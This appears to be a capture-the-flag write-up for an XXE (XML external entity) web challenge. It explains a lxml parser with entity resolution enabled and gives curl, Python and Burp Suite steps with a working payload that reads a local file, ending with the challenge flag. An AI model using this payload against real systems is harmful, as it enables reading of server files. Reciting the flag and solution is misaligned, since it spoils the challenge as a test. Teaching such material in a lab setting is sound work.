# CTF Challenge Writeup: Forbidden Archive
**Challenge Name:** Forbidden Archive  
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Author:** M4hd1Dbh  


## Challenge Description  
Deep within the digital catacombs lies the Forbidden Archive - a repository of ancient knowledge protected by arcane technology. The Archivists communicate in strange markup languages, and whisper of a hidden tome containing the greatest secret of all........

**Hint:** The application loves XML... maybe a little too much. Check how it handles external references..  

**Flag:** `ghctf{XX3_1nj3ct10n_1s_3v1l}`

---

## Vulnerability Analysis

### Code Review
The vulnerable code is located in the `/api` endpoint:

```python
# Vulnerable XML parsing
parser = etree.XMLParser(resolve_entities=True)  # VULNERABLE!
root = etree.fromstring(xml_data, parser)
product_id = root.find('id').text
```

**Key Issues:**
1. **External Entity Resolution:** `resolve_entities=True` enables XXE attacks
2. **No Input Validation:** XML content is processed without sanitization
3. **Error Disclosure:** Invalid product IDs are reflected in error messages

### Attack Vector
When an invalid product ID is submitted, the application returns:
```
<error>Invalid product ID: {product_id}</error>
```

If the `product_id` contains an external entity reference, it will be resolved and the file contents will be displayed in the error message - perfect for XXE exploitation!

---

## Solution Walkthrough  

### Step 1: Analyzing the Application Interface
The challenge presents a simple web interface for accessing the Forbidden Archive data.

- Navigate to the challenge URL and examine the interface
- Notice the application accepts XML requests to query archive data
- The hint suggests checking how the application handles "external references"

### Step 2: Understanding the Request Format

First, test the normal functionality with a valid product request:

```bash
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<root>
    <id>1</id>
</root>'
```

**Expected Response:**
```xml
<product>
    <name>Black Data Archive</name>
    <price>$1k</price>
    <description>Contains classified military intelligence and strategic operations data from 2015-2023. Access requires Omega clearance.</description>
</product>
```

### Step 3: Testing for XXE Vulnerability

Try an invalid product ID to see the error format:

```bash
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<root>
    <id>invalid</id>
</root>'
```

**Expected Response:**
```xml
<error>Invalid product ID: invalid</error>
```

This confirms the application reflects the product ID in error messages - perfect for XXE exploitation!

### Step 4: Crafting the XXE Payload

The goal is to read the hidden flag file using XML External Entity injection.

#### XXE Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<root>
    <id>&xxe;</id>
</root>
```

**Key Components:**
- `<!DOCTYPE root [...]>`: Defines the document type with entities
- `<!ENTITY xxe SYSTEM "file:///app/flag.txt">`: Creates external entity referencing the flag file
- `<id>&xxe;</id>`: References the entity in the product ID field

### Step 5: Executing the Attack

#### Method 1: Using curl
```bash
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<root>
    <id>&xxe;</id>
</root>'
```

#### Method 2: Using Python Script
```python
#!/usr/bin/env python3
import requests

# XXE payload to read flag file
xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<root>
    <id>&xxe;</id>
</root>'''

# Send the attack
response = requests.post(
    'http://localhost:5003/api',
    data=xxe_payload,
    headers={'Content-Type': 'application/xml'}
)

print("Response:", response.text)
```

#### Method 3: Using Burp Suite
1. Intercept a normal XML request to `/api`
2. Replace the XML body with the XXE payload
3. Forward the request
4. Observe the flag in the response

### Step 6: Flag Extraction

**Successful Attack Response:**
```xml
<error>Invalid product ID: ghctf{XX3_1nj3ct10n_1s_3v1l}</error>
```

🚩 **Flag:** `ghctf{XX3_1nj3ct10n_1s_3v1l}`

